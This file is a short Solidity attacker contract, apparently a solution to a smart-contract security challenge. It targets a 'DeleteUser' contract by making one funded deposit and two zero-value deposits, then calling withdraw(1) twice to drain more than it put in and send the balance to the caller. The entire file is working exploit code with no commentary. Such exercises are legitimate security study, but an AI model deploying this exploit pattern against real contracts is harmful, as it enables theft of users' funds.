pragma solidity 0.8.15;

interface IDeleteUser {
    function deposit() external payable;
    function withdraw(uint256 index) external;
}

contract DeleteUser_Attacker {
    IDeleteUser public deleteUser;

    constructor(address _deleteUser) {
        deleteUser = IDeleteUser(_deleteUser);
    }

    function attack() public payable {
        deleteUser.deposit{value: msg.value}();
        deleteUser.deposit{value: 0}();
        deleteUser.deposit{value: 0}();
        deleteUser.withdraw(1);
        deleteUser.withdraw(1);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
